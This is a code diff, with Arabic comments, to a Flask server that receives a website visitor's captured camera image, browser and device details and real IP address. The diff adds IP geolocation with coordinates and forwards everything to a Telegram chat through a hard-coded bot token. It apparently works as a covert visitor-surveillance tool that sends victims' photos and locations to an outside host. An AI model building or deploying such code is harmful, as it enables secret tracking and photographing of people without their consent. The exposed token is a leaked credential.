@@ -7,11 +7,32 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# ⚠️ تم إدراج التوكن ومعرف الدردشة مباشرة (استخدمها بحذر)
+# التوكن ومعرف الدردشة
 TOKEN = "8877750705:AAHSSXX_VU39r_LwcxvE9tB_xe3cTqL990A"
-CHAT_ID = 821436485  # 🔴 هذا الرقم قد لا يكون صحيحًا - استخرجه من @userinfobot إذا لم تعمل الصور
+CHAT_ID = 821436485  # ضع الرقم الصحيح من userinfobot
 
 bot = TeleBot(TOKEN)
+
+def get_location_from_ip(ip):
+    """الحصول على الموقع الجغرافي من IP باستخدام ip-api.com (مجاني، بدون مفتاح)"""
+    try:
+        # تجاهل الـ IP الخاص بالـ localhost أو الـ private
+        if ip.startswith('127.') or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
+            return "محمي (خاص)"
+        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,city,regionName,lat,lon', timeout=5)
+        data = response.json()
+        if data.get('status') == 'success':
+            city = data.get('city', 'غير معروف')
+            region = data.get('regionName', 'غير معروف')
+            country = data.get('country', 'غير معروف')
+            lat = data.get('lat', '')
+            lon = data.get('lon', '')
+            return f"{city}, {region}, {country} (📍 {lat}, {lon})" if lat else f"{city}, {region}, {country}"
+        else:
+            return "غير متاح"
+    except Exception as e:
+        print("خطأ في تحديد الموقع:", e)
+        return "غير متاح"
 
 @app.route('/')
 def index():
@@ -24,6 +45,7 @@ def capture():
         if not data or 'image' not in data:
             return jsonify({"status": "error", "msg": "No image"}), 400
 
+        # فك الصورة
         img_data = base64.b64decode(data['image'].split(',')[1])
 
         # الحصول على IP الحقيقي
@@ -31,20 +53,26 @@ def capture():
         if client_ip and ',' in client_ip:
             client_ip = client_ip.split(',')[0].strip()
 
+        # الحصول على الموقع الجغرافي من IP
+        location = get_location_from_ip(client_ip)
+
+        # معلومات الجهاز من الجافاسكريبت
         device = data.get('device_info', {})
         os_name = device.get('os', 'غير معروف')
         browser = device.get('browser', 'غير معروف')
         screen = device.get('screen', 'غير معروف')
         language = device.get('language', 'غير معروف')
 
+        # بناء رسالة جميلة
         msg = f"<b>📸 صورة من زائر الموقع</b>\n"
-        msg += f"🌍 <b>IP:</b> <code>{client_ip}</code>\n"
-        msg += f"💻 <b>نظام التشغيل:</b> {os_name}\n"
-        msg += f"🌐 <b>المتصفح:</b> {browser}\n"
+        msg += f"🌐 <b>IP:</b> <code>{client_ip}</code>\n"
+        msg += f"📍 <b>الموقع:</b> {location}\n"
+        msg += f"💻 <b>الجهاز:</b> {os_name} | {browser}\n"
         msg += f"📱 <b>دقة الشاشة:</b> {screen}\n"
         msg += f"🗣️ <b>اللغة:</b> {language}\n"
         msg += f"🕒 <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
 
+        # إرسال الصورة مع النص
         bot.send_photo(CHAT_ID, img_data, caption=msg, parse_mode='HTML')
         return jsonify({"status": "sent"})
     except Exception as e:
